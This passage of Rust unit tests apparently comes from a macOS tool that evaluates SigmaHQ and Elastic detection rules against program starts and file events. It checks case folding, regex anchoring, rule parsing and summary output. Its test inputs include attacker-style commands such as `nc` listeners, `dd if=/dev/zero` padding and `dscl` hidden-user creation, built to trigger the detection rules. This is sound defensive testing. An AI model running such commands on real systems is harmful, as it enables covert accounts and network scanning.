            names("/private/etc/emond.d/rules/a.plist"),
            [
                "/private/etc/emond.d/rules/a.plist",
                "/etc/emond.d/rules/a.plist"
            ]
        );
        assert_eq!(names("/private/var/x"), ["/private/var/x", "/var/x"]);
        assert_eq!(names("/Users/x/private/tmp/a"), ["/Users/x/private/tmp/a"]);
        assert_eq!(names("/private/tmpx/a"), ["/private/tmpx/a"]);
        assert_eq!(names("/private/Users/a"), ["/private/Users/a"]);
    }

    /// A start whose message names no program before the `exec` gives no `ParentImage`: the
    /// field is absent, not empty, so a rule asking for an empty parent does not take it for
    /// one.
    #[test]
    fn a_parent_the_start_does_not_give_is_absent_not_empty() {
        let rules = Rules::load(&[(
            "empty-parent.yml",
            invented("    selection:\n        ParentImage: ''\n    condition: selection\n"),
        )]);
        let mut s = start("/bin/x", &["x"], "");
        assert_eq!(rules.evaluate(&s).len(), 1);
        s.parent_executable = None;
        assert!(rules.evaluate(&s).is_empty());
    }

    /// How sure a finding from a published rule is follows the rule's status: a high match of
    /// a rule SigmaHQ calls stable is urgent, one of a rule still in test or experimental is
    /// not, and no published rule is ever sure, since none was tuned to this Mac.
    #[test]
    fn only_a_stable_rule_s_high_match_is_urgent_and_none_is_sure() {
        for (status, urgent) in [
            (Status::Stable, true),
            (Status::Test, false),
            (Status::Experimental, false),
        ] {
            let sure = Some(status.confidence());
            assert_eq!(crate::findings::urgent("high", sure), urgent, "{status:?}");
        }
        assert!(STATUSES.iter().all(|(_, s)| s.confidence() != "high"));
    }

    /// The command line is the arguments joined by single spaces, the first included, so a
    /// rule that reads two arguments as one string, "-s +", sees them; the same written as one
    /// argument is another command line, and the rule does not see it.
    #[test]
    fn the_command_line_is_the_arguments_joined_by_spaces() {
        let s = start(
            "/usr/bin/truncate",
            &["truncate", "-s", "+1", "f"],
            "/bin/sh",
        );
        let (_, command_line) = FIELDS.iter().find(|(n, _)| *n == "CommandLine").unwrap();
        assert_eq!(command_line(&s).as_deref(), Some("truncate -s +1 f"));
        let rules = Rules::shipped();
        assert!(fires(rules, BINARY_PADDING, &s));
        let glued = start("/usr/bin/truncate", &["truncate", "-s+1", "f"], "/bin/sh");
        assert!(!fires(rules, BINARY_PADDING, &glued));
    }

    /// Sigma's values are case-insensitive, and macOS's default file system is too, so
    /// `/BIN/DD` runs `dd`: the evaluator folds case for `endswith`, `contains` and plain
    /// equality alike.
    #[test]
    fn values_match_whatever_their_case() {
        let rules = Rules::shipped();
        let shouted = start("/BIN/DD", &["DD", "IF=/DEV/ZERO"], "/bin/sh");
        assert!(fires(rules, BINARY_PADDING, &shouted));
        let find = start("/USR/BIN/FIND", &["find", "."], "/bin/zsh");
        assert!(fires(rules, FILE_DISCOVERY, &find));
        // `endswith: '/dd'` holds the slash: another program whose name ends in dd is not dd.
        let gdd = start("/usr/local/bin/gdd", &["gdd", "if=/dev/zero"], "/bin/sh");
        assert!(!fires(rules, BINARY_PADDING, &gdd));
    }

    /// Regular expressions are case-sensitive, as the specification says, unlike every other
    /// value: the scanning rule leaves `nc -l`, a listener, to its filter, and `nc -L` is not
    /// one.
    #[test]
    fn regular_expressions_keep_case() {
        let rules = Rules::shipped();
        let listen = start("/usr/bin/nc", &["nc", "-l", "8080"], "/bin/zsh");
        assert!(!fires(rules, NETWORK_SCANNING, &listen));
        let upper = start("/usr/bin/nc", &["nc", "-L", "8080"], "/bin/zsh");
        assert!(fires(rules, NETWORK_SCANNING, &upper));
    }

    /// A regular expression is searched for anywhere in the value, not matched against the
    /// whole of it; the specification does not say which. So "Hidden User Creation", whose
    /// expression means a user id below 500, takes any digit in the command line, and fires
    /// on id 501. Pinned so that a change in the evaluator is seen.
    #[test]
    fn regular_expressions_are_searched_not_anchored() {
        let rules = Rules::shipped();
        let create = start(
            "/usr/bin/dscl",
            &["dscl", ".", "-create", "/Users/example", "UniqueID", "501"],
            "/bin/zsh",
        );
        assert!(fires(rules, HIDDEN_USER, &create));
    }

    /// A field a program start does not give is absent, and an absent field matches nothing.
    /// The renamed-MeshAgent rule is evaluated in part, its `OriginalFileName` alternative
    /// named as never matching here: a renamed MeshAgent started without its service name is
    /// not seen, and the summary says so.
    #[test]
    fn a_field_this_level_does_not_have_never_matches_and_is_named() {
        let rules = Rules::shipped();
        assert_eq!(
            by_id(rules, RENAMED_MESHAGENT).placement,
            Placement::InPart(vec![Branch {
                selection: Some("selection_meshagent".into()),
                fields: vec!["OriginalFileName".into()],
                said: None,
            }])
        );
        let quiet = start("/tmp/.helper", &["/tmp/.helper", "-run"], "/bin/sh");
        assert!(!fires(rules, RENAMED_MESHAGENT, &quiet));
        let s = rules.summary_json();
        assert_eq!(
            s["in_part"]
                .as_array()
                .unwrap()
                .iter()
                .find(|r| r["id_text"] == RENAMED_MESHAGENT)
                .unwrap()["never_matches"],
            json!([{
                "selection_text": "selection_meshagent",
                "fields_text": ["OriginalFileName"],
                "left_out_text": null,
            }])
        );
    }

    /// The browser-child rule leaves out starts without arguments with `CommandLine: ''` and
    /// `CommandLine: null`. Every start has a command line here, empty when there are no
    /// arguments, so `''` is what applies; `null` matches only a field present as null, which
    /// a start never has. A `*` inside a `contains` value is still a wildcard.
    #[test]
    fn an_empty_command_line_and_wildcards_inside_values() {
        let rules = Rules::shipped();
        let parent = "/Applications/Safari.app/Contents/MacOS/Safari";
        let shell = start("/bin/zsh", &["zsh", "-c", "id"], parent);
        assert!(fires(rules, BROWSER_CHILD, &shell));
        let bare = start("/bin/zsh", &[], parent);
        assert!(!fires(rules, BROWSER_CHILD, &bare));
        let update = start(
            "/bin/sh",
            &[
                "sh",
                "/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/msupdate",
            ],
            parent,
        );
        assert!(!fires(rules, BROWSER_CHILD, &update));
    }

    /// File rules are about files written, and their `Image` is the writer, not a program
    /// started: they are asked only about a file event and never match a program start, even
    /// one whose fields would satisfy them; a process rule is never asked about a file event.
    /// A rule about another kind of event, which this level does not read, is not evaluated,
    /// with the reason.
    #[test]
    fn a_rule_is_asked_only_about_events_of_its_kind() {
        let rule = |category: &str| -> &'static str {
            Box::leak(
                format!(
                    "title: Invented\nid: 00000000-0000-4000-8000-000000000001\nstatus: test\n\
                     level: high\nlogsource:\n    category: {category}\n    product: macos\n\
                     detection:\n    selection:\n        Image|endswith: '/curl'\n    condition: selection\n"
                )
                .into_boxed_str(),
            )
        };
        let rules = Rules::load(&[
            ("invented/file.yml", rule("file_event")),
            ("invented/process.yml", rule("process_creation")),
            ("invented/network.yml", rule("network_connection")),
        ]);
        assert_eq!(rules.rules[0].kind, Some(Kind::File));
        assert_eq!(rules.rules[1].kind, Some(Kind::Process));
        assert_eq!(
            rules.rules[2].placement,
            Placement::NotEvaluated(Reason::NeedsEvents("network_connection".into()))
        );
        let curl = start(
            "/usr/bin/curl",
            &["curl", "https://example.invalid"],
            "/bin/zsh",
        );
        let wrote = file("/usr/bin/curl", "/Users/example/.helper", None);
        let asked = |s: Subject| -> Vec<&str> {
            let fast: Vec<&str> = rules.evaluate(s).iter().map(|m| m.file).collect();
            let each: Vec<&str> = rules.evaluate_each(s).iter().map(|m| m.file).collect();
            assert_eq!(fast, each);
            fast
        };
        assert_eq!(asked(Subject::Start(&curl)), ["invented/process.yml"]);
        assert_eq!(asked(Subject::File(&wrote)), ["invented/file.yml"]);
        let m = rules.evaluate(&wrote);
        assert_eq!(m[0].kind, Kind::File);
        assert_eq!(m[0].json()["events"], "file_event");
        let shipped = Rules::shipped();
        assert!(!fires(shipped, AMOS_FILES, &curl));
        assert!(fires(shipped, AMOS_FILES, &wrote));
    }

    const HEAD: &str = "title: Invented\nid: 00000000-0000-4000-8000-000000000002\n";
    const TAIL: &str = "logsource:\n    category: process_creation\n    product: macos\n";
    const PLAIN: &str =
        "detection:\n    selection:\n        Image: '/x'\n    condition: selection\n";

    fn invented(detection: &str) -> &'static str {
        let text = format!("{HEAD}status: test\nlevel: medium\n{TAIL}detection:\n{detection}");
        Box::leak(text.into_boxed_str())
    }

    /// A selection that cannot match without a missing field makes the whole rule not
    /// evaluated, the field named; one alternative of several only makes it evaluated in part.
    /// A keyword search and a rule that cannot be read are named too.
    #[test]
    fn placement_names_what_a_rule_needs() {
        let needs = invented(
            "    selection:\n        Image|endswith: '/x'\n        User: root\n    condition: selection\n",
        );
        let part = invented(
            "    selection:\n        - Image|endswith: '/x'\n        - Hashes|contains: 'a'\n    condition: selection\n",
        );
        let keywords = invented("    keywords:\n        - 'evil'\n    condition: keywords\n");
        let broken =
            invented("    selection:\n        Image: '/x'\n    condition: selection and other\n");
        let rules = Rules::load(&[
            ("needs.yml", needs),
            ("part.yml", part),
            ("keywords.yml", keywords),
            ("broken.yml", broken),
        ]);
        assert_eq!(
            rules.rules[0].placement,
            Placement::NotEvaluated(Reason::NeedsFields(vec!["User".into()]))
        );
        assert_eq!(
            rules.rules[1].placement,
            Placement::InPart(vec![Branch {
                selection: Some("selection".into()),
                fields: vec!["Hashes".into()],
                said: None,
            }])
        );
        assert_eq!(
            rules.rules[2].placement,
            Placement::NotEvaluated(Reason::KeywordSearch)
        );
        let Placement::NotEvaluated(Reason::NotParsed(said)) = &rules.rules[3].placement else {
            panic!("a rule the evaluator cannot read is not parsed");
        };
        assert!(said.contains("other"), "{said}");
        assert!(rules.rules[3].meta.is_none());
        let x = start("/bin/x", &["x", "evil"], "/bin/zsh");
        let hit: Vec<&str> = rules.evaluate(&x).iter().map(|m| m.file).collect();
        assert_eq!(hit, ["part.yml"]);
        let s = rules.summary_json();
        assert_eq!(
            s["totals"],
            json!({ "shipped": 4, "not_taken": 0, "evaluated": 0, "in_part": 1, "not_evaluated": 3 })
        );
    }

    /// A rule is evaluated only when it can be read and has an id, a level and a status of
    /// Sigma's, so that every match can be named and weighed; otherwise it is named as not
    /// parsed, with what was wrong.
    #[test]
    fn a_rule_that_cannot_be_read_is_named_with_why() {
        let leak = |s: String| -> &'static str { Box::leak(s.into_boxed_str()) };
        let rules = Rules::load(&[
            ("yaml.yml", "title: [unclosed\n"),
            (
                "id.yml",
                leak(format!(
                    "title: No id\nstatus: test\nlevel: low\n{TAIL}{PLAIN}"
                )),
            ),
            (
                "level.yml",
                leak(format!("{HEAD}status: test\n{TAIL}{PLAIN}")),
            ),
            (
                "status.yml",
                leak(format!("{HEAD}level: low\n{TAIL}{PLAIN}")),
            ),
            (
                "severe.yml",
                leak(format!("{HEAD}status: test\nlevel: severe\n{TAIL}{PLAIN}")),
            ),
        ]);
        let said: Vec<String> = rules
            .rules
            .iter()
            .map(|l| match &l.placement {
                Placement::NotEvaluated(Reason::NotParsed(said)) => said.clone(),
                other => panic!("{} is {other:?}", l.file),
            })
            .collect();
        assert!(said[0].contains("line 1"), "{}", said[0]);
        assert_eq!(said[1], "the rule has no id");
        assert_eq!(said[2], "the rule has no level");
        assert_eq!(said[3], "the rule has no status");
        assert!(said[4].contains("unknown variant `severe`"), "{}", said[4]);
        let x = start("/x", &["x"], "/bin/zsh");
        assert!(rules.evaluate(&x).is_empty());
    }

    /// An invented rule of a translated set as its translator writes one: `top` is more top
    /// keys, `level` the rule's level line (empty for none) and `severity` the record's.
    fn written(source: &Source, top: &str, level: &str, severity: &str) -> String {
        format!(
            "title: Invented\nid: 00000000-0000-4000-8000-00000000000b\nstatus: test\n{top}{level}\
             logsource: {{\"product\": \"macos\", \"category\": \"process_creation\"}}\n\
             detection:\n  s1: {{\"process.name|cased\": [\"curl\"]}}\n  condition: s1\n{}",
            record_of(source, severity, "")
        )
    }

    /// The reason a file was not read; a panic when it was.
    fn refused(rules: &Rules) -> String {
        match &rules.rules[0].placement {
            Placement::NotEvaluated(Reason::NotParsed(said)) => said.clone(),
            other => panic!("{other:?}"),
        }
    }

    /// A file of a translated set is read only in the shape its translator writes, an
    /// allow-list: top keys among the translator's, the record's keys exactly its, no merge key
    /// `<<` anywhere. So a file of the set that states no level cannot carry a level in any
    /// spelling the reader would ignore, and a file of the translated set that states levels
    /// has the record's `severity` equal to its `level`. Every shipped file has that shape, and
    /// so has none of SigmaHQ's a merge key.
    #[test]
    fn a_translated_rule_is_read_only_in_the_shape_its_translator_writes() {
        for source in SOURCES {
            for (path, text) in source.files {
                let yaml: Value = serde_norway::from_str(text).unwrap();
                assert_eq!(shape(&yaml, source), Ok(()), "{}/{path}", source.folder);
            }
        }
        let leak = |s: String| -> &'static str { Box::leak(s.into_boxed_str()) };
        let behaviour = |top: &str| written(&ELASTIC_BEHAVIOUR, top, "", "null");
        // The record with more keys in front, or with some taken out.
        let record = record_of(&ELASTIC_BEHAVIOUR, "null", "");
        let with_record = |r: String| behaviour("").replace(&record, &r);
        let in_record = |extra: &str| with_record(record.replacen("{", &format!("{{{extra}, "), 1));
        let none = behaviour("");
        assert_eq!(
            Rules::load_as(&ELASTIC_BEHAVIOUR, &[("none.yml", leak(none.clone()))]).rules[0]
                .placement,
            Placement::Evaluated
        );
        for (case, text) in [
            ("level", behaviour("level: high\n")),
            ("Level", behaviour("Level: high\n")),
            ("null level", behaviour("level: null\n")),
            ("level with a space", behaviour("'level ': high\n")),
            ("tagged level", behaviour("!x level: high\n")),
            ("top severity", behaviour("severity: high\n")),
            ("top Severity", behaviour("Severity: critical\n")),
            ("top risk_score", behaviour("risk_score: 99\n")),
            ("custom level", behaviour("custom: {level: high}\n")),
            ("merge at the top", behaviour("<<: {level: high}\n")),
            (
                "anchor and merge",
                behaviour("x-defaults: &d {level: critical}\n<<: *d\n"),
            ),
            (
                "merge in the detection",
                none.replace("  condition: s1", "  <<: {s2: x}\n  condition: s1"),
            ),
            ("merge in the record", in_record("<<: {severity: high}")),
            (
                "severity",
                with_record(
                    record_of(&ELASTIC_BEHAVIOUR, "\"critical\"", "")
                        .replace("\"risk_score\": 47", "\"risk_score\": null"),
                ),
            ),
            (
                "risk_score",
                with_record(record.replace("\"risk_score\": null", "\"risk_score\": 99")),
            ),
            ("record Severity", in_record("\"Severity\": \"high\"")),
            ("record SEVERITY", in_record("\"SEVERITY\": \"high\"")),
            ("record risk-score", in_record("\"risk-score\": 73")),
            ("record riskScore", in_record("\"riskScore\": 73")),
            ("record Risk_Score", in_record("\"Risk_Score\": 73")),
            ("record level", in_record("\"level\": \"high\"")),
            ("record integer key", in_record("1: 73")),
            (
                "record severity_mapping",
                in_record("\"severity_mapping\": [{\"severity\": \"high\"}]"),
            ),
            (
                "record without severity",
                with_record(record.replace("\"severity\": null, \"risk_score\": null, ", "")),
            ),
        ] {
            let rules = Rules::load_as(&ELASTIC_BEHAVIOUR, &[("variant.yml", leak(text))]);
            assert!(
                matches!(
                    rules.rules[0].placement,
                    Placement::NotEvaluated(Reason::NotParsed(_))
                ),
                "{case}: {:?}",
                rules.rules[0].placement
            );
        }
        // The translated set that states levels: the level is the record's severity.
        let elastic = |level: &str, severity: &str| {
            Rules::load_as(
                &ELASTIC,
                &[("variant.yml", leak(written(&ELASTIC, "", level, severity)))],
            )
        };
        assert_eq!(
            elastic("level: high\n", "\"high\"").rules[0].placement,
            Placement::Evaluated
        );
        for (level, severity) in [
            ("level: high\n", "\"medium\""),
            ("level: high\n", "null"),
            ("", "\"high\""),
            ("", "null"),
        ] {
            assert_eq!(
                refused(&elastic(level, severity)),
                "the translation's `severity` is not the rule's `level`",
                "{level:?} {severity}"
            );
        }
        // A merge key is refused in a file of any set.
        let sigma = "title: Invented\nid: 00000000-0000-4000-8000-00000000000c\nstatus: test\n\
                     level: low\n<<: {level: high}\nlogsource: {product: macos, category: process_creation}\n\
                     detection:\n  s1: {Image|endswith: /curl}\n  condition: s1\n";
        assert_eq!(
            refused(&Rules::load_as(&SIGMAHQ, &[("merge.yml", sigma)])),
            "the file has a merge key `<<`, which YAML readers read differently"
        );
        // A set that states no level has a translator's shape, and that shape has no `level`.
        for source in SOURCES.iter().filter(|s| !s.states_levels) {
            let t = source.translation.as_ref().unwrap();
            assert!(!t.keys.iter().any(|k| k.eq_ignore_ascii_case("level")));
            assert!(t.record_keys.contains(&"severity") && t.record_keys.contains(&"risk_score"));
        }
    }

    /// No level is invented. A rule of a set that states none, as Elastic's behaviour rules
    /// state none, is evaluated without a level, matches like any rule and raises no finding by
    /// itself, and its absence is null where a machine reads it. A rule of a set that states
    /// levels is still not read without one. The same holds for the upstream rules a set did not
    /// take: an empty severity only for a set that states none, and only an empty one there.
    #[test]
    fn a_rule_of_a_set_that_states_no_level_is_evaluated_and_raises_nothing_by_itself() {
        let leak = |s: String| -> &'static str { Box::leak(s.into_boxed_str()) };
        let none = Rules::load_as(
            &ELASTIC_BEHAVIOUR,
            &[(
                "none.yml",
                leak(written(&ELASTIC_BEHAVIOUR, "", "", "null")),
            )],
        );
        let m = none.rules[0].meta.as_ref().unwrap();
        assert_eq!(none.rules[0].placement, Placement::Evaluated);
        assert_eq!((m.level, m.raises()), (None, false));
        assert_eq!(
            m.name,
            "elastic-behaviour:00000000-0000-4000-8000-00000000000b"
        );
        let curl = start("/usr/bin/curl", &["curl"], "/bin/zsh");
        let matched = none.evaluate(&curl);
        assert_eq!(matched.len(), 1);
        assert_eq!(matched[0].json()["level"], Json::Null);
        assert_eq!(none.summary_json()["evaluated"][0]["level"], Json::Null);
        // A high rule of a set that states levels raises; the level alone decides.
        let high = Rules::load_as(
            &ELASTIC,
            &[(
                "high.yml",
                leak(written(&ELASTIC, "", "level: high\n", "\"high\"")),
            )],
        );
        assert!(high.rules[0].meta.as_ref().unwrap().raises());
        let bare = "title: Invented\nid: 00000000-0000-4000-8000-00000000000d\nstatus: test\n\
                    logsource: {product: macos, category: process_creation}\n\
                    detection:\n  s1: {Image|endswith: /curl}\n  condition: s1\n";
        assert_eq!(
            refused(&Rules::load_as(&SIGMAHQ, &[("bare.yml", bare)])),
            "the rule has no level"
        );

        let not_taken = |source: &'static Source, severity: &str| {
            let line = format!("macos/x.toml\tid-1\tInvented\t{severity}\tsequence\tSequence");
            let mut loading = Loading::default();
            loading.not_taken(source, Box::leak(line.into_boxed_str()));
            let l = loading.done().rules.remove(0);
            match (l.meta, l.placement) {
                (Some(m), Placement::NotEvaluated(Reason::Sequence)) => Ok(m.level),
                (None, Placement::NotEvaluated(Reason::NotParsed(said))) => Err(said),
                other => panic!("{:?}", other.1),
            }
        };
        assert_eq!(not_taken(&ELASTIC_BEHAVIOUR, ""), Ok(None));
        assert_eq!(not_taken(&ELASTIC, "medium"), Ok(Some(Level::Medium)));
        assert_eq!(
            not_taken(&ELASTIC_BEHAVIOUR, "high"),
            Err("the set states no level, and the line gives the severity \"high\"".into())
        );
        assert_eq!(
            not_taken(&ELASTIC, ""),
            Err("the severity \"\" is not a level".into())
        );
    }

    /// The summary an agent reads has stable names, says what this level gives, and lists
    /// the most severe rules first.
    #[test]
    fn the_summary_has_stable_names() {
        let s = Rules::shipped().summary_json();
        assert_eq!(s["events"], "process_creation");
        assert_eq!(s["file_events"], "file_event");
        let sigma = &s["sources"][0];
        assert_eq!(sigma["name"], "sigma");
        assert_eq!(
            sigma["fields"],
            json!({
                "process_creation": ["Image", "CommandLine", "ParentImage"],
                "file_event": ["TargetFilename", "Image"],
            })
        );
        assert_eq!(sigma["commit"], COMMIT);
        assert_eq!(sigma["licence"], "DRL-1.1");
        let elastic = &s["sources"][1];
        assert_eq!(
            (
                &elastic["name"],
                &elastic["licence"],
                &elastic["translated"]
            ),
            (&json!("elastic"), &json!("Elastic-2.0"), &json!(true))
        );
        assert_eq!(elastic["commit"], ELASTIC.commit);
        let behaviour = &s["sources"][2];
        assert_eq!(
            (&behaviour["name"], &behaviour["url"], &behaviour["commit"]),
            (
                &json!("elastic-behaviour"),
                &json!("https://github.com/elastic/protections-artifacts"),
                &json!("a87715d87a2babd51b37ff6c55f104fe7e567911")
            )
        );
        // Each set says in words what it is and whether its rules state levels.
        let said: Vec<(&Json, &Json)> = s["sources"]
            .as_array()
            .unwrap()
            .iter()
            .map(|x| (&x["set"], &x["states_levels"]))
            .collect();
        assert_eq!(
            said,
            [
                (&json!("SigmaHQ's rule set"), &json!(true)),
                (&json!("Elastic's detection rules"), &json!(true)),
                (&json!("Elastic's behaviour rules"), &json!(false)),
            ]
        );
        // The most severe first; a rule that states no level, `null`, after every level.
        let evaluated = s["evaluated"].as_array().unwrap();
        assert_eq!(evaluated[0]["level"], "high");
        let stated = evaluated.iter().take_while(|r| !r["level"].is_null());
        assert_eq!(stated.last().unwrap()["level"], "informational");
        let none: Vec<&Json> = evaluated.iter().filter(|r| r["level"].is_null()).collect();
        assert_eq!(none.len(), 47);
        assert!(none.iter().all(|r| r["source"] == "elastic-behaviour"));
        assert!(
            evaluated[evaluated.len() - 47..]
                .iter()
                .all(|r| r["level"].is_null())
        );
        let padding = evaluated
            .iter()
            .find(|r| r["id_text"] == BINARY_PADDING)
            .unwrap();
        assert_eq!(
            padding,
            &json!({
                "source": "sigma",
                "set": "SigmaHQ's rule set",
                "name": format!("sigma:{BINARY_PADDING}"),
                "file": "rules/macos/process_creation/proc_creation_macos_binary_padding.yml",
                "id_text": BINARY_PADDING,
                "title_text": "Binary Padding - MacOS",
                "level": "high",
                "status": "test",
                "events": "process_creation",
            })
        );
        let lines = Rules::shipped().summary_lines(None);
        assert_eq!(
            lines[0],
            "Published rules for macOS: 75 from SigmaHQ's rule set at d7c9da10c170 of 2026-11-10, all shipped; 185 from Elastic's detection rules at 032ac5ecb0b4, 66 of them translated into Sigma and shipped, 119 not taken; 278 from Elastic's behaviour rules at a87715d87a2b, 57 of them translated into Sigma and shipped, 221 not taken, none with a level stated."
        );
        assert!(
            lines
                .iter()
                .any(|l| l.contains("selection_meshagent needs OriginalFileName"))
        );
        assert!(lines.iter().any(|l| l == "Evaluated in full: 175, 162 on every program start and 13 on every file created or renamed"));
        // A person reads that a rule states no level, in the level's column, and its set beside
        // its title; the rules of such a set come after the rest under their own heading.
        let at = |line: &str| lines.iter().position(|l| l == line);
        let heading = at("  Of a set that states no level: 47").expect("the group's heading");
        let ditto =
            at("  no level stated Sensitive File Copy via Ditto (Elastic's behaviour rules)");
        assert!(ditto.is_some_and(|d| d > heading), "{lines:?}");
        assert!(
            lines
                [heading..at("Evaluated in part, some alternatives never match here: 23").unwrap()]
                .iter()
                .skip(1)
                .all(|l| l.starts_with("  no level stated ")),
            "{lines:?}"
        );
    }

    /// A value as a text it stands for: a wildcard made a letter or nothing, an escape undone,
    /// as the evaluator reads them.
    fn literal(value: &str) -> String {
        let mut out = String::new();
        let mut escaped = false;
        for c in value.chars() {
            match (c, escaped) {
                ('\\', false) => escaped = true,
                ('*', false) => {}
                ('?', false) => out.push('x'),
                ('*' | '?' | '\\', true) => {
                    out.push(c);
                    escaped = false;
                }
                (c, true) => {
                    out.push('\\');
                    out.push(c);
                    escaped = false;
                }
                (c, false) => out.push(c),
            }
        }
        if escaped {
            out.push('\\');
        }
        out
    }

    /// A start and a file event that give each field the maps name its `k`-th value, or its
    /// last, placed as the field's modifiers say: what it starts with first, what it holds,
    /// what it ends with.
    fn start_from_maps(maps: &[&serde_norway::Mapping], k: usize) -> (ProcessStart, FileEvent) {
        type Parts = (Option<String>, Vec<String>, Option<String>, Option<String>);
        let mut fields: BTreeMap<&str, Parts> = BTreeMap::new();
        for (key, value) in maps.iter().flat_map(|m| m.iter()) {
            let Some(key) = key.as_str() else { continue };
            let mut it = key.split('|');
            let field = it.next().unwrap_or_default();
            let modifiers: Vec<String> = it.map(str::to_lowercase).collect();
            let has = |m: &str| modifiers.iter().any(|x| x == m);
            let values: Vec<String> = match value {
                Value::Sequence(items) => items
                    .iter()
                    .filter_map(Value::as_str)
                    .map(literal)
                    .collect(),
                v => v.as_str().map(literal).into_iter().collect(),
            };
            let Some(last) = values.last() else { continue };
            let chosen = if has("all") {
                values.join(" ")
            } else {
                values.get(k).unwrap_or(last).clone()
            };
            let parts = fields.entry(field).or_default();
            if has("startswith") {
                parts.0 = Some(chosen);
            } else if has("endswith") {
                parts.2 = Some(chosen);
            } else if has("contains") || has("re") {
                parts.1.push(chosen);
            } else {
                parts.3 = Some(chosen);
            }
        }
        let value = |field: &str| -> Option<String> {
            let (head, middle, tail, whole) = fields.get(field)?;
            if let Some(whole) = whole {
                return Some(whole.clone());
            }
            let middle = (!middle.is_empty()).then(|| middle.join(" "));
            let joined: Vec<String> = [head.clone(), middle, tail.clone()]
                .into_iter()
                .flatten()
                .collect();
            Some(joined.join(" "))
        };
        // Under SigmaHQ's names or under Elastic's, whichever the rule reads.
        let named = |name: Option<String>| name.map(|n| format!("/usr/bin/{n}"));
        let image = value("Image")
            .or_else(|| value("process.executable"))
            .or_else(|| named(value("process.name")))
            .unwrap_or_else(|| "/usr/bin/true".into());
        let mut args: Vec<String> = value("process.args")
            .map(|a| {
                a.split(['\0', ' '])
                    .filter(|a| !a.is_empty())
                    .map(str::to_string)
                    .collect()
            })
            .unwrap_or_default();
        args.extend(value("process.command_line"));
        if args.is_empty() {
            args.push(value("CommandLine").unwrap_or_else(|| "true".into()));
        }
        let start = ProcessStart {
            executable: image.clone(),
            args,
            parent_executable: value("ParentImage")
                .or_else(|| value("process.parent.executable"))
                .or_else(|| named(value("process.parent.name"))),
            working_directory: value("process.working_directory"),
            user_id: value("user.id").and_then(|u| u.parse().ok()),
            ..ProcessStart::default()
        };
        let path = value("TargetFilename")
            .or_else(|| value("file.path"))
            .or_else(|| value("file.name").map(|n| format!("/private/tmp/{n}")))
            .unwrap_or_else(|| "/private/tmp/x".into());
        let path = match value("file.extension") {
            Some(e) => format!("{path}.{e}"),
            None => path,
        };
        (start, file(&image, &path, None))
    }

    /// Starts and file events made from the shipped rules' own values: for each map of each
    /// selection, one per value; and for each rule, ones that meet every selection not named as
    /// a filter at once, as most conditions ask. So every rule meets events it matches or
    /// nearly matches: starts from the rules for program starts, file events from the rules
    /// for file events.
    fn starts_from_rules() -> (Vec<ProcessStart>, Vec<FileEvent>) {
        let widest = |map: &serde_norway::Mapping| {
            map.values()
                .map(|v| v.as_sequence().map_or(1, Vec::len))
                .max()
                .unwrap_or(1)
        };
        let (mut all_starts, mut all_files) = (Vec::new(), Vec::new());
        for (_, text) in SOURCES.iter().flat_map(|s| s.files) {
            let yaml: Value = serde_norway::from_str(text).unwrap();
            let Some(detection) = yaml["detection"].as_mapping() else {
                continue;
            };
            let mut starts = Vec::new();
            let mut together: Vec<Vec<&serde_norway::Mapping>> = Vec::new();
            for (name, selection) in detection {
                let Some(name) = name.as_str().filter(|n| *n != "condition") else {
                    continue;
                };
                let maps: Vec<&serde_norway::Mapping> = match selection {
                    Value::Mapping(m) => vec![m],
                    Value::Sequence(items) => items.iter().filter_map(Value::as_mapping).collect(),
                    _ => vec![],
                };
                for map in &maps {
                    starts.extend((0..widest(map)).map(|k| start_from_maps(&[map], k)));
                }
                if !name.starts_with("filter") && !maps.is_empty() {
                    together.push(maps);
                }
            }
            let rounds = together.iter().flatten().map(|m| widest(m)).max();
            for k in 0..rounds.unwrap_or(0) {
                let maps: Vec<&serde_norway::Mapping> =
                    together.iter().map(|maps| maps[k % maps.len()]).collect();
                starts.push(start_from_maps(&maps, k));
            }
            let (s, f): (Vec<_>, Vec<_>) = starts.into_iter().unzip();
            if yaml["logsource"]["category"].as_str() == Some(FILE_CATEGORY) {
                all_files.extend(f);
            } else {
                all_starts.extend(s);
            }
        }
        (all_starts, all_files)
    }

    /// A start with each of its texts changed the same way.
    fn changed(s: &ProcessStart, f: impl Fn(&str) -> String) -> ProcessStart {
        ProcessStart {
            executable: f(&s.executable),
            args: s.args.iter().map(|a| f(a)).collect(),
            parent_executable: s.parent_executable.as_deref().map(&f),
            ..s.clone()
        }
    }

    /// A start with one field, by its place in `FIELDS`, changed.
    fn one_field(s: &ProcessStart, field: usize, f: impl Fn(&str) -> String) -> ProcessStart {
        let mut s = s.clone();
        match field {
            0 => s.executable = f(&s.executable),
            1 => s.args = vec![f(&s.args.join(" "))],
            _ => s.parent_executable = s.parent_executable.as_deref().map(f),
        }
        s
    }

    /// The same start written so that folding case is put to the test: in capitals; with the
    /// Kelvin sign, which folds to `k`; with `İ`, which folds to two characters; with the long
    /// s, which folds to itself; with a final sigma; one character short; with no parent and no
    /// arguments; with no texts at all. And with something before or after one field, so that
    /// where a text must stand is put to the test.
    fn variants(s: &ProcessStart) -> Vec<ProcessStart> {
        let mut no_parent = s.clone();
        no_parent.parent_executable = None;
        let mut no_args = s.clone();
        no_args.args.clear();
        let around = (0..FIELDS.len()).flat_map(|field| {
            [
                one_field(s, field, |t| format!("z {t}")),
                one_field(s, field, |t| format!("{t} z")),
            ]
        });
        around
            .chain([
                s.clone(),
                changed(s, str::to_uppercase),
                changed(s, |t| t.replace(['k', 'K'], "\u{212A}")),
                changed(s, |t| t.replace(['i', 'I'], "\u{130}")),
                changed(s, |t| t.replace('s', "\u{17F}")),
                changed(s, |t| format!("{t} ΟΔΟΣ")),
                changed(s, |t| {
                    let mut t = t.to_string();
                    t.pop();
                    t
                }),
                no_parent,
                no_args,
                changed(s, |_| String::new()),
            ])
            .collect()
    }

    /// The same file event written so that folding case and where a text stands are put to the
    /// test, each field on its own and both at once, and with the path through and around
    /// macOS's links into `/private`.
    fn file_variants(f: &FileEvent) -> Vec<FileEvent> {
        let both = |g: &dyn Fn(&str) -> String| FileEvent {
            path: g(&f.path),
            executable: g(&f.executable),
            ..f.clone()
        };
        let path = |p: String| FileEvent {
            path: p,
            ..f.clone()
        };
        let image = |e: String| FileEvent {
            executable: e,
            ..f.clone()
        };
        let short = |t: &str| {
            let mut t = t.to_string();
            t.pop();
            t
        };
        vec![
            f.clone(),
            path(format!("z {}", f.path)),
            path(format!("{} z", f.path)),
            path(format!("/private{}", f.path)),
            path(f.path.trim_start_matches("/private").to_string()),
            image(format!("z {}", f.executable)),
